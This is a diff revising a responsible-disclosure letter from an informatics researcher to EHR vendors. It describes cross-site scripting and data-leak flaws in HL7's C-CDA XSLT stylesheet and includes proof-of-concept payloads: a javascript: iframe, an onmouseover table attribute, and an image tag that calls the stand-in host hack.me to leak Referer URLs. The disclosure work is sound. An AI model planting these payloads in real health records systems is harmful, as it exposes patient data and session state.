@@ -1,6 +1,6 @@
-### Dear EHR Vendor,
+﻿### Dear EHR Vendor,
 
-I'm a medidcal informatics research at Boston Children's Hospital, and I'm
+I'm a medical informatics researcher at Boston Children's Hospital, and I'm
 writing to share some security considerations pertinent to any EHR that
 displays Consolidated CDA documents for Meaningful Use (especially in a Web
 browser environment). I would appreciate if you could ensure that the message
@@ -16,27 +16,25 @@ Best,
 
 ### Dear Security Team,
 
-I'm writing to report a *potential* security vulnerability in your display of
+I'm writing to report a *potential security vulnerability* in your display of
 Consolidated CDA documents. To be clear, I haven't confirmed whether your EHR
-products are vulnerable to the issues below, but I have found that they do
-affect *some EHR systems*, and I wanted to share this report with Web-based EHR
-vendors privately before I describe it in public on the [SMART Platforms
+products are vulnerable to the issues below, but I have found that they
+*affect some production EHR systems*, and I wanted to share this report with Web-based EHR vendors privately before I describe it in public on the [SMART Platforms
 blog](http://smartplatforms.org).
 
-Effectively, the concern has to do with the use of XSLT "stylesheets" to
-display externally-supplied C-CDA documents in the EHR. The ready-to-go
-stylesheets provided by HL7 (which I've seen broadly adopted by many EHR
-vendors) were not designed with security in mind -- which can open EHRs up to
-attacks by maliciously-composed documents.
+In short, the concern has to do with the use of XSLT "stylesheets" to
+display externally-supplied C-CDA documents in the EHR. To be specific:
+**the ready-to-go stylesheet provided by HL7 (which I've seen broadly adopted by many EHR vendors) were not designed with security in mind -- and this can 
+leave EHRs vulnerable to attacks by maliciously-composed documents.**
 
 The "TL;DR" version is: If you're using XSLT stylesheets to render C-CDAs in
 your EHR, make sure you understand the security implications. Otherwise you
 could be vulnerable to a data breach.
 
-I would appreciate if you could reply to me so I can track the dissemination of
+**I would appreciate if you could reply to me** so I can track the dissemination of
 this notice. My plan is to write a public blog post that would be published on
 3/21/2014. If you discover that your system is vulnerable and you need more
-time to repair it, please let me know that, and I can delay publication.
+time to repair it, please let me know that, and I can delay publication if necessary.
 
 Best,
 
@@ -53,16 +51,10 @@ Many vendors appear to be using (slightly modified) versions of the
 with HL7's C-CDA release. This provides potential attackers with a highly
 visible, leveragable target.
 
-Based on my analysis of the XSLT, there are at least three ways to craft a
-malacious C-CDA. I'll discuss both in detail:
+My analysis revealed at least three ways to craft a malicious C-CDA. I'll discuss both in detail:
 
-1. Use unsanitized `table/@onmouseover` to execute JavaScript code anytime the C-CDA is viewd
 
-2. Use unsanitized `iframe/@src` to execute JavaScript code anytime the C-CDA is viewed
-
-3. Use `img/@src` references that leak application state in an HTTP `Referer` header
-
-#### Via `iframe` in nonXMLBody
+#### 1. Unsanitized `nonXMLBody/text/reference/@value` can execute JavaScript
 One opportunity for injection attacks is the default handling of a `nonXMLBody` CDA. 
 
 ```
@@ -90,7 +82,7 @@ The resulting HTML rendering would include the following dangerous snippet:
   <iframe src="javascript:alert(window.parent.location);"></iframe>
 ```
 
-#### Via `table` attributes
+#### 2. Unsanitized `table/@onmouseover` can execute JavaScript
 
 A valid C-CDA document is not allowed to provide `table/@onmouseover`
 attributes. But if invalid documents are allowed into a system, then the
@@ -142,7 +134,7 @@ can increase the attack surface to encompass the entire page:
 Now the infected table covers the entire document area, so moving the mouse
 anywhere within the document will cause our code to run. 
 
-#### Leaking application state through externally loaded images
+#### Unsanitized `observationMedia/value/reference/@value` can leak state via HTTP `Referer` headers
 
 Searching CDA.xsl for the term `img`, reveals two places where image tags are
 emitted.  Both occur within the `renderMultiMedia` template definition:
@@ -187,3 +179,5 @@ The resulting HTML would include the potentially dangerous snippet:
 ```
 <img src="https://hack.me/leaked-from-image.png"></img>
 ```
+
+Each time the document is viewed, the browser sends an HTTP `Referer` header to `hack.me` that inclues the source page URL. This can be dangerous if any private session state is embedded in that URL.
